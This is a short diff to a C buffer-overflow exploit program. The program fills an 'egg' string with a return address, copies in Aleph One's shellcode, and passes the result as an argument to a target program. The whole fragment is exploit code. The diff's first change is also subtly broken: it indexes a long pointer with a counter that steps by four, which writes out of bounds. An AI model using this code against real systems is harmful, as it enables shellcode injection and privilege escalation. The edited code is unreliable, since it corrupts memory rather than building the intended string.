@@ -37,13 +37,13 @@ int main(void)
      start address of our code */
   addrPtr = (long *) egg; 
   for (i = 0; i < EGG_SIZE; i += 4)
-    *(addrPtr++) = buffAddr;
+    addrPtr[i] = buffAddr;
   
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
   ptr = egg;
   for (i = 0; i < strlen(shellcode); i++)
-    *(ptr++) = shellcode[i];
+    ptr[i] = shellcode[i];
 
   egg[EGG_SIZE - 1] = 0; /* null terminate exploit string for safety */
   args[1] = egg;
